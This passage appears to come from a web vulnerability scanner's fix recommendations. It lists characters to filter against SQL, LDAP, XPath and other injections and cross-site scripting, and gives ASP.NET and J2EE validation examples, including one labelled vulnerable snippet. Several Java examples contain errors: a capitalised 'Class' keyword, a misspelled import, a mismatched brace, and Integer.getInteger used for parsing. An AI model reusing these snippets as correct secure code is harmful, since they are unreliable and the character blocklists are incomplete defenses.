              <indentText>   [5] %  (percent sign)</indentText>
              <indentText>   [6] @  (at sign)</indentText>
              <indentText>   [7] '  (single apostrophe)</indentText>
              <indentText>   [8] "  (quotation mark)</indentText>
              <indentText>   [9] \' (backslash-escaped apostrophe)</indentText>
              <indentText>   [10] \" (backslash-escaped quotation mark)</indentText>
              <indentText>   [11] &lt;&gt; (triangular parenthesis)</indentText>
              <indentText>   [12] () (parenthesis)</indentText>
              <indentText>   [13] +  (plus sign)</indentText>
              <indentText>   [14] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [15] LF (Line feed, ASCII 0x0a)</indentText>
              <indentText>   [16] ,  (comma sign)</indentText>
              <indentText>   [17] \  (backslash)</indentText>
              <br />
              <br />
              <text>The following sections describe the various issues, their fix recommendations and the hazardous characters that might trigger these issues:</text>
              <br />
              <br />
              <br />
              <text>SQL injection and blind SQL injection:</text>
              <br />
              <text>A. Make sure the value and type (such as Integer, Date, etc.) of the user input is valid and expected by the application.</text>
              <br />
              <text>B. Use stored procedures to abstract data access so that users do not directly access tables or views. When using stored procedures, use the ADO command object to implement them, so that variables are strongly typed.</text>
              <br />
              <text>C. Sanitize input to exclude context-changing symbols such as:</text>
              <br />
              <indentText>   [1] '  (single apostrophe)</indentText>
              <indentText>   [2] "  (quotation mark)</indentText>
              <indentText>   [3] \' (backslash-escaped apostrophe)</indentText>
              <indentText>   [4] \" (backslash-escaped quotation mark)</indentText>
              <indentText>   [5] )  (closing parenthesis)</indentText>
              <indentText>   [6] ;  (semicolon)</indentText>
              <br />
              <br />
              <text>Cross site scripting:</text>
              <br />
              <text>A. Sanitize user input and filter out JavaScript code. We suggest that you filter the following characters:</text>
              <br />
              <indentText>   [1] &lt;&gt; (triangular parenthesis)</indentText>
              <indentText>   [2] "  (quotation mark)</indentText>
              <indentText>   [3] '  (single apostrophe)</indentText>
              <indentText>   [4] %  (percent sign)</indentText>
              <indentText>   [5] ;  (semicolon)</indentText>
              <indentText>   [6] () (parenthesis)</indentText>
              <indentText>   [7] &amp;  (ampersand sign)</indentText>
              <indentText>   [8] +  (plus sign)</indentText>
              <text>B. To fix the &lt;%00script&gt; variant see MS article 821349</text>
              <br />
              <text>C. For UTF-7 attacks:</text>
              <br />
              <indentText>   [-] When possible, it is recommended to enforce a specific charset encoding (using 'Content-Type' header or &lt;meta&gt; tag).</indentText>
              <br />
              <text>HTTP response splitting:</text>
              <br />
              <text>Sanitize user input (at least, such input that is later embedded in HTTP responses).</text>
              <br />
              <text>Make sure that malicious characters are not part of the input, such as:</text>
              <br />
              <indentText>   [1] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [2] LF (Line feed, ASCII 0x0a)</indentText>
              <br />
              <br />
              <text>Remote command execution:</text>
              <br />
              <text>Sanitize input to exclude symbols that are meaningful to the operating system's command execution, such as:</text>
              <br />
              <indentText>    [1] |  (pipe sign)</indentText>
              <indentText>    [2] &amp;  (ampersand sign)</indentText>
              <indentText>    [3] ;  (semicolon sign)</indentText>
              <indentText>   </indentText>
              <br />
              <text>Shell command execution:</text>
              <br />
              <text>A. Never pass unchecked user-input to Perl commands such as: eval(), open(), sysopen(), system().</text>
              <br />
              <text>B. Make sure malicious characters are not part of the input, such as:</text>
              <br />
              <indentText>    [1] $  (dollar sign)</indentText>
              <indentText>    [2] %  (percent sign)</indentText>
              <indentText>    [3] @  (at sign)</indentText>
              <br />
              <br />
              <text>XPath injection:</text>
              <br />
              <text>Sanitize input to exclude context changing symbols such as:</text>
              <br />
              <indentText>   [1] '  (single apostrophe)</indentText>
              <indentText>   [2] "  (quotation mark)</indentText>
              <indentText>   Etc.</indentText>
              <indentText>   </indentText>
              <br />
              <text>LDAP injection:</text>
              <br />
              <text>A. Use positive validation. Alphanumeric filtering (A..Z,a..z,0..9)  is suitable for most LDAP queries.</text>
              <br />
              <text>B. Special LDAP characters which should be filtered out or escaped:</text>
              <br />
              <indentText>   [1] A space or "#" character at the beginning of the string </indentText>
              <indentText>   [2] A space character at the end of the string </indentText>
              <indentText>   [3] ,   (comma sign)</indentText>
              <indentText>   [4] +   (plus sign)</indentText>
              <indentText>   [5] "   (quotation mark)</indentText>
              <indentText>   [6] \   (backslash)</indentText>
              <indentText>   [7] &lt;&gt;  (triangular parenthesis)</indentText>
              <indentText>   [8] ;   (semicolon sign)</indentText>
              <indentText>   [9] ()  (parenthesis)</indentText>
              <br />
              <br />
              <text>MX Injection: </text>
              <br />
              <text>Special MX characters should be filtered out: </text>
              <br />
              <indentText>   [1] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [2] LF (Line feed, ASCII 0x0a)</indentText>
              <br />
              <text>Log Forging: </text>
              <br />
              <text>Special logging characters should be filtered out: </text>
              <br />
              <indentText>   [1] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [2] LF (Line feed, ASCII 0x0a)</indentText>
              <indentText>   [3] BS (Backspace, ASCII 0x08)</indentText>
              <br />
              <text>ORM Injection: </text>
              <br />
              <text>A. Make sure the value and type (such as Integer, Date, etc.) of the user input are valid and expected by the application.</text>
              <br />
              <text>B. Use stored procedures to abstract data access so that users do not directly access tables or views.</text>
              <br />
              <text>C. Use a parameterized queries API</text>
              <br />
              <text>D. Sanitize input to exclude context-changing symbols such as (*):</text>
              <br />
              <indentText>   [1] ' (single apostrophe)</indentText>
              <indentText>   [2] " (quotation mark)</indentText>
              <indentText>   [3] \' (backslash-escaped apostrophe)</indentText>
              <indentText>   [4] \" (backslash-escaped quotation mark)</indentText>
              <indentText>   [5] ) (closing parenthesis)</indentText>
              <indentText>   [6] ; (semicolon)</indentText>
              <indentText> </indentText>
              <indentText>   (*) This applies to SQL. High level query languages may need a different sanitization mechanism.</indentText>
            </fixRecommendation>
            <fixRecommendation type="ASP.NET">
              <text>[1] We recommend that you upgrade your server to .NET Framework 2.0 (or newer), which includes inherent security checks that protect against cross site scripting attacks.</text>
              <br />
              <text>[2] You can add input validation to Web Forms pages by using validation controls. Validation controls provide an easy-to-use mechanism for all common types of standard validation (for example, tests for valid dates or values within a range). The validation controls also support custom-written validations, and allow you to completely customize how error information is displayed to the user. Validation controls can be used with any controls that are processed in a Web Forms page class file, including both HTML and Web server controls.</text>
              <br />
              <br />
              <text>To make sure that user input contains only valid values, you can use one of the following validation controls:</text>
              <br />
              <br />
              <text>[1] "RangeValidator": checks that a user's entry (value) is between specified lower and upper boundaries. You can check ranges within pairs of numbers, alphabetic characters, and dates.</text>
              <br />
              <br />
              <text>[2] "RegularExpressionValidator": checks that the entry matches a pattern defined by a regular expression. This type of validation allows you to check for predictable sequences of characters, such as those in social security numbers, e-mail addresses, telephone numbers, postal codes, and so on.</text>
              <br />
              <br />
              <text>Examples of regular expressions that may help block cross site scripting:</text>
              <br />
              <br />
              <text>- A possible regular expression, which will deny the basic cross site scripting variants might be: ^([^&lt;]|\&lt;[^a-zA-Z])*[&lt;]?$</text>
              <br />
              <text>- A generic regular expression, which will deny all of the aforementioned characters might be: ^([^\&lt;\&gt;\"\'\%\;\)\(\&amp;\+]*)$</text>
              <br />
              <br />
              <text>Important note: validation controls do not block user input or change the flow of page processing; they only set an error state, and produce error messages. It is the programmer's responsibility to test the state of the controls in the code before performing further application-specific actions.</text>
              <br />
              <br />
              <text>There are two ways to check for user input validity: </text>
              <br />
              <br />
              <text>1. Test for a general error state: </text>
              <br />
              <text>In your code, test the page's IsValid property. This property rolls up the values of the IsValid properties of all the validation controls on the page (using a logical AND). If one of the validation controls is set to invalid, the page's property will return false.</text>
              <br />
              <br />
              <text>2. Test for the error state of individual controls:</text>
              <br />
              <text>Loop through the page's Validators collection, which contains references to all the validation controls. You can then examine the IsValid property of each validation control.</text>
              <br />
              <br />
              <text>Finally, we recommend that the Microsoft Anti-Cross Site Scripting Library (v1.5 or higher) be used to encode untrusted user input.</text>
              <br />
              <br />
              <text>The Anti-Cross Site Scripting library exposes the following methods:</text>
              <br />
              <br />
              <text>[1] HtmlEncode - Encodes input strings for use in HTML</text>
              <br />
              <text>[2] HtmlAttributeEncode - Encodes input strings for use in HTML attributes</text>
              <br />
              <text>[3] JavaScriptEncode - Encodes input strings for use in JavaScript</text>
              <br />
              <text>[4] UrlEncode - Encodes input strings for use in Universal Resource Locators (URLs)</text>
              <br />
              <text>[5] VisualBasicScriptEncode - Encodes input strings for use in Visual Basic Script</text>
              <br />
              <text>[6] XmlEncode - Encodes input strings for use in XML</text>
              <br />
              <text>[7] XmlAttributeEncode - Encodes input strings for use in XML attributes</text>
              <br />
              <br />
              <text>To properly use the Microsoft Anti-Cross Site Scripting Library to protect ASP.NET Web-applications, you need to:</text>
              <br />
              <br />
              <text>Step 1: Review ASP.NET code that generates output</text>
              <br />
              <text>Step 2: Determine whether output includes untrusted input parameters</text>
              <br />
              <text>Step 3: Determine the context which the untrusted input is used as output, and determine which encoding method to use</text>
              <br />
              <text>Step 4: Encode output</text>
              <br />
              <br />
              <br />
              <text>Example for Step 3:</text>
              <br />
              <br />
              <text>Note: If the untrusted input will be used to set an HTML attribute, then the Microsoft.Security.Application.HtmlAttributeEncode method should be used to encode the untrusted input.</text>
              <br />
              <text>Alternatively, if the untrusted input will be used within the context of JavaScript, then Microsoft.Security.Application.JavaScriptEncode should be used to encode.</text>
              <br />
              <br />
              <code>  // Vulnerable code
  // Note that untrusted input is being treated as an HTML attribute
  Literal1.Text = "&lt;hr noshade size=[untrusted input here]&gt;";
  // Modified code
  Literal1.Text = "&lt;hr noshade size="+Microsoft.Security.Application.AntiXss.HtmlAttributeEncode([untrusted input here])+"&gt;";
</code>
              <br />
              <br />
              <text>Example for Step 4:</text>
              <br />
              <text>Some important things to remember about encoding outputs:</text>
              <br />
              <br />
              <text>[1] Outputs should be encoded once.</text>
              <br />
              <text>[2] Output encoding should be done as close to the actual writing of the output as possible.  For example, if an application is reading user input, processing the input and then writing it back out in some form, then encoding should happen just before the output is written.</text>
              <br />
              <br />
              <code>  // Incorrect sequence
  protected void Button1_Click(object sender, EventArgs e)
  {
      // Read input
      String Input = TextBox1.Text;
      // Encode untrusted input
      Input = Microsoft.Security.Application.AntiXss.HtmlEncode(Input);
      // Process input
      ...
      // Write Output
      Response.Write("The input you gave was"+Input);
  }
  // Correct Sequence
  protected void Button1_Click(object sender, EventArgs e)
  {
      // Read input
      String Input = TextBox1.Text;
      // Process input
      ...
      // Encode untrusted input and write output
      Response.Write("The input you gave was"+ 
          Microsoft.Security.Application.AntiXss.HtmlEncode(Input));
  }
</code>
            </fixRecommendation>
            <fixRecommendation type="J2EE">
              <text>** Input Data Validation:</text>
              <br />
              <br />
              <text>While data validations may be provided as a user convenience on the "client" tier data, validation must be performed on the server-tier using Servlets.  Client-side validations are inherently insecure because they can be easily bypassed, e.g. by disabling Javascript.</text>
              <br />
              <br />
              <text>A good design usually requires the web application framework to provide server-side utility routines to validate the following:</text>
              <br />
              <text>[1] Required field</text>
              <br />
              <text>[2] Field data type (all HTTP request parameters are Strings by default)</text>
              <br />
              <text>[3] Field length</text>
              <br />
              <text>[4] Field range</text>
              <br />
              <text>[5] Field options</text>
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>[7] Cookie values</text>
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <br />
              <text>A good practice is to implement the above routine as static methods in a "Validator" utility class.  The following sections describe an example validator class.</text>
              <br />
              <br />
              <text>[1] Required field</text>
              <br />
              <text>Always check that the field is not null and its length is greater than zero, excluding leading and trailing white spaces.  </text>
              <br />
              <br />
              <text>Example of how to validate required fields:</text>
              <br />
              <br />
              <code>  // Java example to validate required fields
  public Class Validator {
      ...
      public static boolean validateRequired(String value) {
          boolean isFieldValid = false;
          if (value != null &amp;&amp; value.trim().length() &gt; 0) {
              isFieldValid = true;
          }
          return isFieldValid;
      }
      ...
  }
  ...
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateRequired(fieldValue)) {
      // fieldValue is valid, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <text>[2] Field data type</text>
              <br />
              <text>In web applications, input parameters are poorly typed.  For example, all HTTP request parameters or cookie values are of type String.  The developer is responsible for verifying that the input is of the correct data type.  Use the Java primitive wrapper classes to check if the field value can be safely converted to the desired primitive data type.</text>
              <br />
              <br />
              <text>Example of how to validate a numeric field (type int):</text>
              <br />
              <br />
              <code>  // Java example to validate that a field is an int number
  public Class Validator {
      ...
      public static boolean validateInt(String value) {
          boolean isFieldValid = false;
          try {
              Integer.parseInt(value);
              isFieldValid = true;
          } catch (Exception e) {
              isFieldValid = false;
          }
          return isFieldValid;
      }
      ...
  }
  ...
  // check if the HTTP request parameter is of type int
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateInt(fieldValue)) {
      // fieldValue is valid, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <text>A good practice is to convert all HTTP request parameters to their respective data types.  For example, the developer should store the "integerValue" of a request parameter in a request attribute and use it as shown in the following example:</text>
              <br />
              <br />
              <code>  // Example to convert the HTTP request parameter to a primitive wrapper data type
  // and store this value in a request attribute for further processing
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateInt(fieldValue)) {
      // convert fieldValue to an Integer
      Integer integerValue = Integer.getInteger(fieldValue);
      // store integerValue in a request attribute
      request.setAttribute("fieldName", integerValue);
  }
  ...
  // Use the request attribute for further processing
  Integer integerValue = (Integer)request.getAttribute("fieldName");
  ...
</code>
              <br />
              <br />
              <text>The primary Java data types that the application should handle:</text>
              <br />
              <text>- Byte</text>
              <br />
              <text>- Short</text>
              <br />
              <text>- Integer</text>
              <br />
              <text>- Long</text>
              <br />
              <text>- Float</text>
              <br />
              <text>- Double</text>
              <br />
              <text>- Date</text>
              <br />
              <br />
              <text>[3] Field length</text>
              <br />
              <text>Always ensure that the input parameter (whether HTTP request parameter or cookie value) is bounded by a minimum length and/or a maximum length.</text>
              <br />
              <br />
              <text>Example to validate that the length of the userName field is between 8 and 20 characters:</text>
              <br />
              <br />
              <code>  // Example to validate the field length
  public Class Validator {
      ...
      public static boolean validateLength(String value, int minLength, int maxLength) {
          String validatedValue = value;
          if (!validateRequired(value)) {
              validatedValue = "";
          }
          return (validatedValue.length() &gt;= minLength &amp;&amp;
                      validatedValue.length() &lt;= maxLength);
      }
      ...
  }
  ...
  String userName = request.getParameter("userName");
  if (Validator.validateRequired(userName)) {
      if (Validator.validateLength(userName, 8, 20)) {
          // userName is valid, continue further processing
          ...
      }
  }
</code>
              <br />
              <br />
              <text>[4] Field range</text>
              <br />
              <text>Always ensure that the input parameter is within a range as defined by the functional requirements.</text>
              <br />
              <br />
              <text>Example to validate that the input numberOfChoices is between 10 and 20:</text>
              <br />
              <br />
              <code>  // Example to validate the field range
  public Class Validator {
      ...
      public static boolean validateRange(int value, int min, int max) {
          return (value &gt;= min &amp;&amp; value &lt;= max);
      }
      ...
  }
  ...
  String fieldValue = request.getParameter("numberOfChoices");
  if (Validator.validateRequired(fieldValue)) {
      if (Validator.validateInt(fieldValue)) {
          int numberOfChoices = Integer.parseInt(fieldValue);
          if (Validator.validateRange(numberOfChoices, 10, 20)) {
              // numberOfChoices is valid, continue processing request
              ...
          }
      }
  }
</code>
              <br />
              <br />
              <text>[5] Field options</text>
              <br />
              <text>Often, the web application presents the user with a set of options to choose from, e.g. using the SELECT HTML tag, but fails to perform server-side validation to ensure that the selected value is one of the allowed options.  Remember that a malicious user can easily modify any option value.  Always validate the selected user value against the allowed options as defined by the functional requirements.</text>
              <br />
              <br />
              <text>Example to validate the user selection against a list of allowed options:</text>
              <br />
              <br />
              <code>  // Example to validate user selection against a list of options
  public Class Validator {
      ...
      public static boolean validateOption(Object[] options, Object value) {
          boolean isValidValue = false;
          try {
              List list = Arrays.asList(options);
              if (list != null) {
                  isValidValue = list.contains(value);
              }
          } catch (Exception e) {
          }
          return isValidValue;
      }
      ...
  }
  ...
  // Allowed options
  String[] options = {"option1", "option2", "option3");
  // Verify that the user selection is one of the allowed options
  String userSelection = request.getParameter("userSelection");
  if (Validator.validateOption(options, userSelection)) {
      // valid user selection, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>Always check that the user input matches a pattern as defined by the functionality requirements.  For example, if the userName field should only allow alpha-numeric characters, case insensitive, then use the following regular expression:</text>
              <br />
              <text>^[a-zA-Z0-9]*$</text>
              <br />
              <br />
              <text>Java 1.3 or earlier versions do not include any regular expression packages.  Apache Regular Expression Package (see Resources below) is recommended for use with Java 1.3 to resolve this lack of support.  Example to perform regular expression validation:</text>
              <br />
              <br />
              <code>  // Example to validate that a given value matches a specified pattern
  // using the Apache regular expression package
  import org.apache.regexp.RE;
  import org.apache.regexp.RESyntaxException;
  public Class Validator {
      ...
      public static boolean matchPattern(String value, String expression) {
          boolean match = false;
          if (validateRequired(expression)) {
               RE r = new RE(expression);
               match = r.match(value);             
          }
          return match;
      }
      ...
  }
  ...
  // Verify that the userName request parameter is alphanumeric
  String userName = request.getParameter("userName");
  if (Validator.matchPattern(userName, "^[a-zA-Z0-9]*$")) {
      // userName is valid, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <text>Java 1.4 introduced a new regular expression package (java.util.regex).  Here is a modified version of Validator.matchPattern using the new Java 1.4 regular expression package:</text>
              <br />
              <br />
              <code>  // Example to validate that a given value matches a specified pattern
  // using the Java 1.4 regular expression package
  import java.util.regex.Pattern;
  import java.util.regexe.Matcher;
  public Class Validator {
      ...
      public static boolean matchPattern(String value, String expression) {
          boolean match = false;
          if (validateRequired(expression)) {
              match = Pattern.matches(expression, value);
          }
          return match;
      }
      ...
  }
</code>
              <br />
              <br />
              <text>[7] Cookie value</text>
              <br />
              <text>Use the javax.servlet.http.Cookie object to validate the cookie value.  The same validation rules (described above) apply to cookie values depending on the application requirements (validate a required value, validate length, etc).</text>
              <br />
              <br />
              <text>Example to validate a required cookie value:</text>
              <br />
              <br />
              <code>  // Example to validate a required cookie value
  // First retrieve all available cookies submitted in the HTTP request
  Cookie[] cookies = request.getCookies();
  if (cookies != null) {
      // find the "user" cookie
      for (int i=0; i&lt;cookies.length; ++i) {
          if (cookies[i].getName().equals("user")) {
              // validate the cookie value
              if (Validator.validateRequired(cookies[i].getValue()) {
                  // valid cookie value, continue processing request
                  ...
              }
          }    
      }
  }
</code>
              <br />
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <text>[8-1] Filter user input</text>
              <br />
              <text>To guard the application against cross-site scripting, sanitize HTML by converting sensitive characters to their corresponding character entities.  These are the HTML sensitive characters:</text>
              <br />
              <text>&lt; &gt; " ' % ; ) ( &amp; +</text>
              <br />
              <br />
              <text>Example to filter a specified string by converting sensitive characters to their corresponding character entities:</text>
              <br />
              <br />
              <code>  // Example to filter sensitive data to prevent cross-site scripting
  public Class Validator {
      ...
      public static String filter(String value) {
          if (value == null) {
              return null;
          }        
          StringBuffer result = new StringBuffer(value.length());
          for (int i=0; i&lt;value.length(); ++i) {
              switch (value.charAt(i)) {
              case '&lt;':
                  result.append("&amp;lt;");
                  break;
              case '&gt;': 
                  result.append("&amp;gt;");
                  break;
              case '"': 
                  result.append("&amp;quot;");
                  break;
              case '\'': 
                  result.append("&amp;#39;");
                  break;
              case '%': 
                  result.append("&amp;#37;");
                  break;
              case ';': 
                  result.append("&amp;#59;");
                  break;
              case '(': 
                  result.append("&amp;#40;");
                  break;
              case ')': 
                  result.append("&amp;#41;");
                  break;
              case '&amp;': 
                  result.append("&amp;amp;");
                  break;
              case '+':
                  result.append("&amp;#43;");
                  break;
              default:
                  result.append(value.charAt(i));
                  break;
          }        
          return result;
      }
      ...
  }
  ...
  // Filter the HTTP response using Validator.filter
  PrintWriter out = response.getWriter();
  // set output response
  out.write(Validator.filter(response));
  out.close();
</code>
              <br />
              <br />
              <text>The Java Servlet API 2.3 introduced filters, which support the interception and transformation of HTTP requests or responses.</text>
              <br />
              <br />
              <text>Example of using a Servlet Filter to sanitize the response using Validator.filter:</text>
              <br />
              <br />
              <code>  // Example to filter all sensitive characters in the HTTP response using a Java Filter.
  // This example is for illustration purposes since it will filter all content in the response, including HTML tags!
  public class SensitiveCharsFilter implements Filter {
      ...
      public void doFilter(ServletRequest request,
                      ServletResponse response,
                      FilterChain chain)
              throws IOException, ServletException {
          PrintWriter out = response.getWriter();
          ResponseWrapper wrapper = new ResponseWrapper((HttpServletResponse)response);
          chain.doFilter(request, wrapper);
          CharArrayWriter caw = new CharArrayWriter();
          caw.write(Validator.filter(wrapper.toString()));
          
          response.setContentType("text/html");
          response.setContentLength(caw.toString().length());
          out.write(caw.toString());
          out.close();
      }
      ...
      public class CharResponseWrapper extends HttpServletResponseWrapper {
          private CharArrayWriter output;
          public String toString() {
              return output.toString();
          }
      
          public CharResponseWrapper(HttpServletResponse response){
              super(response);
              output = new CharArrayWriter();
          }
          
          public PrintWriter getWriter(){
              return new PrintWriter(output);
          }
      }
  } 
  }
</code>
              <br />
              <br />
              <text>[8-2] Secure the cookie</text>
              <br />
              <text>When storing sensitive data in a cookie, make sure to set the secure flag of the cookie in the HTTP response, using Cookie.setSecure(boolean flag) to instruct the browser to send the cookie  using  a secure protocol, such as HTTPS or SSL.</text>
              <br />
              <br />
              <text>Example to secure the "user" cookie:</text>
              <br />
              <br />
              <code>  // Example to secure a cookie, i.e. instruct the browser to
  // send the cookie using a secure protocol
  Cookie cookie = new Cookie("user", "sensitive");
  cookie.setSecure(true);
  response.addCookie(cookie);
</code>
              <br />
              <br />
              <text>RECOMMENDED JAVA TOOLS</text>
              <br />
              <text>The two main Java frameworkss for server-side validation are:</text>
              <br />
              <text>[1] Jakarta Commons Validator (integrated with Struts 1.1)</text>
              <br />
              <text>The Jakarta Commons Validator is a powerful framework that implements all the above data validation requirements.  These rules are configured in an XML file that defines input validation rules for form fields.  Struts supports output filtering of dangerous characters in the [8] HTTP Response by default on all data written using the Struts 'bean:write' tag.  This filtering may be disabled by setting the 'filter=false' flag.</text>
              <br />
              <br />
              <text>Struts defines the following basic input validators, but custom validators may also be defined:</text>
              <br />
              <text>required: succeeds if the field contains any characters other than whitespace.</text>
              <br />
              <text>mask: succeeds if the value matches the regular expression given by the mask attribute.</text>
              <br />
              <text>range: succeeds if the value is within the values given by the min and max attributes ((value &gt;= min) &amp; (value &lt;= max)).</text>
              <br />
              <text>maxLength: succeeds if the field is length is less than or equal to the max attribute.</text>
              <br />
              <text>minLength: succeeds if the field is length is greater than or equal to the min attribute.</text>
              <br />
              <text>byte, short, integer, long, float, double: succeeds if the value can be converted to the corresponding primitive.</text>
              <br />
              <text>date: succeeds if the value represents a valid date. A date pattern may be provided.</text>
              <br />
              <text>creditCard: succeeds if the value could be a valid credit card number.</text>
              <br />
              <text>email: succeeds if the value could be a valid e-mail address.</text>
              <br />
              <br />
              <text>Example to validate the userName field of a loginForm using Struts Validator:</text>
              <br />
              <code>  &lt;form-validation&gt;
      &lt;global&gt;
          ...
          &lt;validator name="required"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateRequired"
              msg="errors.required"&gt;
          &lt;/validator&gt;
          &lt;validator name="mask"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateMask"
              msg="errors.invalid"&gt;
          &lt;/validator&gt;
          ...
      &lt;/global&gt;
      &lt;formset&gt;
          &lt;form name="loginForm"&gt;
              &lt;!-- userName is required and is alpha-numeric case insensitive --&gt;
              &lt;field property="userName" depends="required,mask"&gt;
                  &lt;!-- message resource key to display if validation fails --&gt;
                  &lt;msg name="mask" key="login.userName.maskmsg"/&gt;
                  &lt;arg0 key="login.userName.displayname"/&gt;
                  &lt;var&gt;
                      &lt;var-name&gt;mask&lt;/var-name&gt;
                      &lt;var-value&gt;^[a-zA-Z0-9]*$&lt;/var-value&gt;
                  &lt;/var&gt;
              &lt;/field&gt;
          ...
          &lt;/form&gt;
          ...
      &lt;/formset&gt;
  &lt;/form-validation&gt;
</code>
              <br />
              <br />
              <text>[2] JavaServer Faces Technology</text>
              <br />
              <text>JavaServer Faces Technology is a set of Java APIs (JSR 127) to represent UI components, manage their state, handle events, and validate input.</text>
              <br />
              <br />
              <text>The JavaServer Faces API implements the following basic validators, but custom validators may be defined:</text>
              <br />
              <text>validate_doublerange: registers a DoubleRangeValidator on a component.</text>
              <br />
              <text>validate_length: registers a LengthValidator on a component.</text>
              <br />
              <text>validate_longrange: registers a LongRangeValidator on a component.</text>
              <br />
              <text>validate_required: registers a RequiredValidator on a component.</text>
              <br />
              <text>validate_stringrange: registers a StringRangeValidator on a component.</text>
              <br />
              <text>validator: registers a custom Validator on a component.</text>
              <br />
              <br />
              <text>The JavaServer Faces API defines the following UIInput and UIOutput Renderers (Tags):</text>
              <br />
              <text>input_date: accepts a java.util.Date formatted with a java.text.Date instance.</text>
              <br />
              <text>output_date: displays a java.util.Date formatted with a java.text.Date instance.</text>
              <br />
              <text>input_datetime: accepts a java.util.Date formatted with a java.text.DateTime instance.</text>
              <br />
              <text>output_datetime: displays a java.util.Date formatted with a java.text.DateTime instance.</text>
              <br />
              <text>input_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat.</text>
              <br />
              <text>output_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat.</text>
              <br />
              <text>input_text: accepts a text string of one line.</text>
              <br />
              <text>output_text: displays a text string of one line.</text>
              <br />
              <text>input_time: accepts a java.util.Date, formatted with a java.text.DateFormat time instance.</text>
              <br />
              <text>output_time: displays a java.util.Date, formatted with a java.text.DateFormat time instance.</text>
              <br />
              <text>input_hidden: allows a page author to include a hidden variable in a page.</text>
              <br />
              <text>input_secret: accepts one line of text with no spaces and displays it as a set of asterisks as it is typed.</text>
              <br />
              <text>input_textarea: accepts multiple lines of text.</text>
              <br />
              <text>output_errors: displays error messages for an entire page or error messages associated with a specified client identifier.</text>
              <br />
              <text>output_label: displays a nested component as a label for a specified input field.</text>
              <br />
              <text>output_message: displays a localized message.</text>
              <br />
              <br />
              <text>Example to validate the userName field of a loginForm using JavaServer Faces:</text>
              <br />
              <code>  &lt;%@ taglib uri="http://java.sun.com/jsf/html" prefix="h" %&gt;
  &lt;%@ taglib uri="http://java.sun.com/jsf/core" prefix="f" %&gt;
  ...
  &lt;jsp:useBean id="UserBean"
      class="myApplication.UserBean" scope="session" /&gt;
  &lt;f:use_faces&gt;
    &lt;h:form formName="loginForm" &gt;
      &lt;h:input_text id="userName" size="20" modelReference="UserBean.userName"&gt;
          &lt;f:validate_required/&gt;
          &lt;f:validate_length minimum="8" maximum="20"/&gt;    
      &lt;/h:input_text&gt;
      &lt;!-- display errors if present --&gt;
      &lt;h:output_errors id="loginErrors" clientId="userName"/&gt;
      &lt;h:command_button id="submit" label="Submit" commandName="submit" /&gt;&lt;p&gt;
    &lt;/h:form&gt;
  &lt;/f:use_faces&gt;
</code>
              <br />
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <text>Java API 1.3 - </text>
              <link target="http://java.sun.com/j2se/1.3/docs/api/">http://java.sun.com/j2se/1.3/docs/api/</link>
              <br />
              <text>Java API 1.4 - </text>
              <link target="http://java.sun.com/j2se/1.4/docs/api/">http://java.sun.com/j2se/1.4/docs/api/</link>
              <br />
              <text>Java Servlet API 2.3 - </text>
              <link target="http://java.sun.com/products/servlet/2.3/javadoc/">http://java.sun.com/products/servlet/2.3/javadoc/</link>
              <br />
              <text>Java Regular Expression Package - </text>
              <link target="http://jakarta.apache.org/regexp/">http://jakarta.apache.org/regexp/</link>
              <br />
              <text>Jakarta Validator - </text>
              <link target="http://jakarta.apache.org/commons/validator/">http://jakarta.apache.org/commons/validator/</link>
              <br />
              <text>JavaServer Faces Technology - </text>
              <link target="http://java.sun.com/j2ee/javaserverfaces/">http://java.sun.com/j2ee/javaserverfaces/</link>
              <br />
              <br />
              <text>** Error Handling:</text>
              <br />
              <br />
              <text>Many J2EE web application architectures follow the Model View Controller (MVC) pattern.  In this pattern a Servlet acts as a Controller.  A Servlet delegates the application processing to a JavaBean such as an EJB Session Bean (the Model).  The Servlet then forwards the request to a JSP (View) to render the processing results.  Servlets should check all input, output, return codes, error codes and known exceptions to ensure that the expected processing actually occurred.</text>
              <br />
              <br />
              <text>While data validation protects applications against malicious data tampering, a sound error handling strategy is necessary to prevent the application from inadvertently disclosing internal error messages such as exception stack traces.  A good error handling strategy addresses the following items:</text>
              <br />
              <br />
              <text>[1] Defining Errors</text>
              <br />
              <text>[2] Reporting Errors</text>
              <br />
              <text>[3] Rendering Errors</text>
              <br />
              <text>[4] Error Mapping</text>
              <br />
              <br />
              <text>[1] Defining Errors</text>
              <br />
              <text>Hard-coded error messages in the application layer (e.g. Servlets) should be avoided.  Instead, the application should use error keys that map to known application failures.  A good practice is to define error keys that map to validation rules for HTML form fields or other bean properties.  For example, if the "user_name" field is required, is alphanumeric, and must be unique in the database, then the following error keys should be defined:</text>
              <br />
              <br />
              <text>(a) ERROR_USERNAME_REQUIRED: this error key is used to display a message notifying the user that the "user_name" field is required;</text>
              <br />
              <text>(b) ERROR_USERNAME_ALPHANUMERIC: this error key is used to display a message notifying the user that the "user_name" field should be alphanumeric;</text>
              <br />
              <text>(c) ERROR_USERNAME_DUPLICATE: this error key is used to display a message notifying the user that the "user_name" value is a duplicate in the database;</text>
              <br />
              <text>(d) ERROR_USERNAME_INVALID: this error key is used to display a generic message notifying the user that the "user_name" value is invalid;</text>
              <br />
              <br />
              <text>A good practice is to define the following framework Java classes which are used to store and report application errors:</text>
              <br />
              <br />
              <text>- ErrorKeys: defines all error keys</text>
              <br />
              <br />
              <code>      // Example: ErrorKeys defining the following error keys:    
      //    - ERROR_USERNAME_REQUIRED
      //    - ERROR_USERNAME_ALPHANUMERIC
      //    - ERROR_USERNAME_DUPLICATE
      //    - ERROR_USERNAME_INVALID
      //    ...
